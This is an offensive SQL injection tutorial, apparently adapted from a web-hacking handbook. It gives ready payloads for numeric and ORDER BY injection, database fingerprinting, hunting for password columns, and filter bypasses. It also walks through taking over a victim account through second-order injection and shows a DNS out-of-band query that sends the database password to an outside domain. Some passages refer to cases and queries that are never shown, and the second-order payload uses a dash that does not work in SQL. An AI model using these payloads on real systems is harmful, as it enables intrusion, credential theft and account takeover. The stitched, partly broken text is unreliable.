## Injecting into Numeric Data

When user-supplied numeric data is incorporated into a SQL query, the application may still handle this as string data by encapsulating it within single quotation marks. Therefore, you should always follow the steps described previously for string data. In most cases, however, numeric data is passed directly to the database in numeric form and therefore is not placed within single quotation marks. If none of the previous tests points toward the presence of a vulnerability, you can take some other speciﬁc steps in relation to numeric data.

1. Try supplying a simple mathematical expression that is equivalent to the original numeric value. For example, if the original value is 2, try submitting 1+1 or 3-1. If the application responds in the same way, it may be vulnerable. 
 
2. The preceding test is most reliable in cases where you have confirmed that the item being modified has a noticeable effect on the application’s behavior. For example, if the application uses a numeric PageID parameter to specify which content should be returned, substituting 1+1 for 2 with equivalent results is a good sign that SQL injection is present. However, if you can place arbitrary input into a numeric parameter without changing the application’s behavior, the preceding test provides no evidence of a vulnerability. 

3. If the first test is successful, you can obtain further evidence of the vulnerability by using more complicated expressions that use SQL-specific keywords and syntax. A good example of this is the ASCII command, which returns the numeric ASCII code of the supplied character. For example, because the ASCII value of A is 65, the following expression is equivalent to 2 in SQL:
```67-ASCII(‘A’)```
 
4. The preceding test will not work if single quotes are being filtered. However, in this situation you can exploit the fact that databases implicitly convert numeric data to string data where required. Hence, because the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL:
```51-ASCII(1)```

## Injection into Query Structure

If user-supplied data is being inserted into the structure of the SQL query itself, rather than an item of data within the query, exploiting SQL injection simply involves directly supplying valid SQL syntax. No “escaping” is required to break out of any data context. The most common injection point within the SQL query structure is within an ORDER BY clause. The ORDER BY keyword takes a column name or number and orders the result set according to the values in that column. This functionality is frequently exposed to the user to allow sorting of a table within the browser. A typical example is a sortable table of books that is retrieved using this query:

``` SELECT author, title, year FROM books WHERE publisher = ‘Wiley’ ORDER BY title ASC ```

1. Make a note of any parameters that appear to control the order or field types within the results that the application returns. 
 
2. Make a series of requests supplying a numeric value in the parameter value, starting with the number 1 and incrementing it with each subsequent request: 

- If changing the number in the input affects the ordering of the results, the input is probably being inserted into an ORDER BY clause. In SQL, ORDER BY 1 orders by the ﬁrst column. Increasing this number to 2 should then change the display order of data to order by the second column. If the number supplied is greater than the number of columns in the result set, the query should fail. In this situation, you can conﬁrm that further SQL can be injected by checking whether the results order can be reversed, using the following:

   ``` 1 ASC -- , 1 DESC --  ```

- If supplying the number 1 causes a set of results with a column containing a 1 in every row, the input is probably being inserted into the name of a column being returned by the query. For example: ``` SELECT 1,title,year FROM books WHERE publisher=’Wiley’ ```

Exploiting SQL injection in an ORDER BY clause is significantly different from most other cases. A database will not accept a UNION, WHERE, OR, or AND keyword at this point in the query. Generally exploitation requires the attacker to specify a nested query in place of the parameter, such as replacing the column name with ```(select 1 where <<condition>> or 1/0=0)```, thereby leveraging the inference techniques described later in this chapter. For databases that support batched queries such as MS-SQL, this can be the most efficient option

 ## Fingerprinting the Database
 
You have already seen how you can extract the version string of the major database types. Even if this cannot be done for some reason, it is usually possible to ﬁngerprint the database using other methods. One of the most reliable is the different means by which databases concatenate strings. In a query where you control some item of string data, you can supply a particular value in one request and then test different methods of concatenation to produce that string. When the same results are obtained, you have probably identiﬁed the type of database being used. The following examples show how the string services could be constructed on the common types of database:
 
 - Oracle: ‘serv’||’ices’ 
 - MS-SQL: ‘serv’+’ices’ 
 - MySQL: ‘serv’ ‘ices’ (note the space) CONCAT('foo','bar')
 - PostgreSQL: 	'foo'||'bar'
 
- Microsoft, MySQL:	SELECT @@version
- Oracle:	SELECT * FROM v$version
- PostgreSQL:	SELECT version()
 
If you are injecting into numeric data, the following attack strings can be used to ﬁ ngerprint the database. Each of these items evaluates to 0 on the target database and generates an error on the other databases:
- Oracle: BITAND(1,1)-BITAND(1,1) 
- MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED 
- MySQL: CONNECTION_ID()-CONNECTION_ID()
 
 ## Extracting Data
 
To extract useful data from the database, normally you need to know the names of the tables and columns containing the data you want to access. The main enterprise DBMSs contain a rich amount of database metadata that you can query to discover the names of every table and column within the database. The methodology for extracting useful data is the same in each case; however, the details differ on different database platforms
 
The information_schema is supported by MS-SQL, MySQL, and many other databases, including SQLite and Postgresql. It is designed to hold database metadata, making it a primary target for attackers wanting to examine the database. Note that Oracle doesn’t support this schema. When targeting an Oracle database, the attack would be identical in every other way. However, you would use the query ```SELECT table_name,column_name FROM all_tab_ columns``` to retrieve information about tables and columns in the database. (You would use the user_tab_columns table to focus on the current database only.) When analyzing large databases for points of attack, it is usually best to look directly for interesting column names rather than tables. For instance:
``` 
SELECT table_name,column_name FROM information_schema.columns where column_name LIKE ‘%PASS%’
```

 When multiple columns are returned from a target table, these can be concatenated into a single column. This makes retrieval more straightforward, because it requires identiﬁcation of only a single varchar ﬁeld in the original query: 
 ```
  Oracle: SELECT table_name||’:’||column_name FROM all_tab_columns 
  MS-SQL: SELECT table_name+’:’+column_name from information_ schema.columns 
  MySQL: SELECT CONCAT(table_name,’:’,column_name) from information_schema.columns
```
# Bypassing Filters
## Avoiding Blocked Characters

If the application removes or encodes some characters that are often used in SQL injection attacks, you may still be able to perform an attack without these: 

 - The single quotation mark is not required if you are injecting into a numeric data ﬁeld or column name. If you need to introduce a string into your attack payload, you can do this without needing quotes. You can use various string functions to dynamically construct a string using the ASCII codes for individual characters. For example, the following two queries for Oracle and MS-SQL, respectively, are the equivalent of ```select ename, sal from emp where ename=’marcus’```:

```
 SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)|| CHR(114)||CHR(99)||CHR(117)||CHR(115)
 SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97) +CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
```
- If the comment symbol is blocked, you can often craft your injected data such that it does not break the syntax of the surrounding query, even without using this. For example, instead of injecting:
```
‘ or 1=1--
```
you can inject:
```
‘ or ‘a’=’a
```
- When attempting to inject batched queries into an MS-SQL database, you do not need to use the semicolon separator. Provided that you fix the syntax of all queries in the batch, the query parser will interpret them correctly, whether or not you include a semicolon.

## Circumventing Simple Validation

Some input validation routines employ a simple blacklist and either block or remove any supplied data that appears on this list. In this instance, you should try the standard attacks, looking for common defects in validation and canoni-calization mechanisms, as described in Chapter 2. For example, if the ```SELECT``` keyword is being blocked or removed, you can try the following bypasses:

```
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
```

## Using SQL Comments

You can insert inline comments into SQL statements in the same way as for C++, by embedding them between the symbols /* and */. If the application blocks or strips spaces from your input, you can use comments to simulate whitespace within your injected data. For example:
```
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
```
In MySQL, comments can even be inserted within keywords themselves, which provides another means of bypassing some input validation filters while preserving the syntax of the actual query. For example:
```
SEL/*foo*/ECT username,password FR/*foo*/OM users
```
## Second Order Sql Injection

A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:

   - Firstly, we STORE a particular user-supplied input value in the DB and
   - Secondly, we use the stored value to exploit a vulnerability in a vulnerable function in the source code which constructs the dynamic query of the web application.

So let’s get down to business and look at how a vulnerable application could be exploited in more detail with the help of a hypothetical scenario:

It could be possible to exploit some functions that don’t need user input and uses data already saved in the DB, that retrieves when needed. The password reset functionality!

A victim user “User123” could be registered on the website with a very strong and secure password but we still really want to get his account. In a second order SQL Injection we should be able to do something like:

Register a new account. We want to name this new user as ```“User123' — “``` and password ```“UserPass@123”```

Payload: ```“User123' — “```

Then we can reset our password and set a new one in the appropriate form.

The legit query will be:

```$pwdreset = mysql_query(“UPDATE users SET password=’getrekt’ WHERE username=’User123' — ‘ and password=’UserPass@123'”);```

BUT since — is the character used to comment in SQL, the query will result being this:

```$pwdreset = mysql_query(“UPDATE users SET password=’getrekt’ WHERE username=’User123'”);```

And boom! You’re there. This will set a new password chosen by us for the victim user account!

## Retrieving Data as Numbers

It is fairly common to find that no string fields within an application are vulnerable to SQL injection, because input containing single quotation marks is being handled properly. However, vulnerabilities may still exist within numeric data fields, where user input is not encapsulated within single quotes. Often in these situations, the only means of retrieving the results of your injected queries is via a numeric response from the application.

In this situation, your challenge is to process the results of your injected queries in such a way that meaningful data can be retrieved in numeric form.
Two key functions can be used here:
 - ```ASCII```, which returns the ASCII code for the input character
 - ```SUBSTRING``` (or ```SUBSTR``` in Oracle), which returns a substring of its input
These functions can be used together to extract a single character from a string in numeric form. For example:
  
  ```SUBSTRING(‘Admin’,1,1)``` returns A.
  
  ```ASCII(‘A’)``` returns 65.

Therefore:

 ```ASCII(SUBSTR(‘Admin’,1,1))``` returns 65.

Using these two functions, you can systematically cut a string of useful data into its individual characters and return each of these separately, in numeric
form. In a scripted attack, this technique can be used to quickly retrieve and reconstruct a large amount of string-based data one byte at a time.

## Using Out of Band Requests

In many cases of SQL injection, the application does not return the results of any injected query to the user’s browser, nor does it return any error messages generated by the database. In this situation, it may appear that your position is futile. Even if a SQL injection flaw exists, it surely cannot be exploited to extract arbitrary data or perform any other action. This appearance is false, however.
You can try various techniques to retrieve data and verify that other malicious
actions have been successful.

One method for retrieving data that is often effective in this situation is to use an out-of-band channel. Having achieved the ability to execute arbitrary SQL statements within the database, it is often possible to leverage some of the database’s built-in functionality to create a network connection back to your own computer, over which you can transmit arbitrary data that you have gathered from the database.

The means of creating a suitable network connection are highly database- dependent. Different methods may or may not be available given the privilege level of the database user with which the application is accessing the database. Some of the most common and effective techniques for each type of database are described here.

If the MySQL database server is started with an empty secure_file_priv global system variable, which is the case by default for MySQL server 5.5.52 and below (and in the MariaDB fork), an attacker can exfiltrate data and then use the load_file function to create a request to a domain name, putting the exfiltrated data in the request.

Let’s say the attacker is able to execute the following SQL query in the target database:

```SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))```

This will cause the application to send a DNS request to the domain database_version.database_user.database_password.example.com, exposing sensitive data (database version, user name, and the user’s password) to the attacker.

## Conditional Responses

In the first case, the application logs you in as the admin user. In the second case, the login attempt fails, because the 1=2 condition is always false. You can leverage this control of the application’s behavior as a means of inferring the truth or falsehood of arbitrary conditions within the database itself. For example, using the ASCII and SUBSTRING functions described previously, you can test whether a specific character of a captured string has a specific value. For example, submitting this piece of input logs you in as the admin user, because the condition tested is true:

```admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--```

Submitting the following input, however, results in a failed login, because the condition tested is false:

```admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 66--``` 

By submitting a large number of such queries, cycling through the range of likely ASCII codes for each character until a hit occurs, you can extract the entire string, one byte at a time

## Inducing Conditional Errors

In some cases, you may be injecting into a query that has no noticeable effect on the application’s behavior, such as a logging mechanism. In other cases, you may be injecting a subquery or a batched query whose results are not processed by the application in any way. In this situation, you may struggle to find a way to cause a detectable difference in behavior that is contingent on a specified condition.

David Litchfield devised a technique that can be used to trigger a detectable difference in behavior in most circumstances. The core idea is to inject a query that induces a database error contingent on some specified condition. When a database error occurs, it is often externally detectable, either through an HTTP 500 response code or through some kind of error message or anomalous behavior (even if the error message itself does not disclose any useful information).

This causes the database to work through each row of table Y, evaluating condition C, and returning X in those cases where condition C is true. If condition C is never true, the expression X is never evaluated.

This behavior can be exploited by finding an expression X that is syntactically  valid but that generates an error if it is ever evaluated. An example of such an expression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0. If condition C is ever true, expression X is evaluated, causing a database error. If condition C is always false, no error is generated. You can, therefore, use the presence or absence of an error to test an arbitrary condition C. 

An example of this is the following query, which tests whether the default Oracle user DBSNMP exists. If this user exists, the expression 1/0 is evaluated, causing an error:

```SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’```

The following query tests whether an invented user AAAAAA exists. Because the WHERE condition is never true, the expression 1/0 is not evaluated, so no error occurs:

```SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘AAAAAA’) = ‘AAAAAA'```

References:

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#MySQLIf

https://portswigger.net/web-security/sql-injection/cheat-sheet
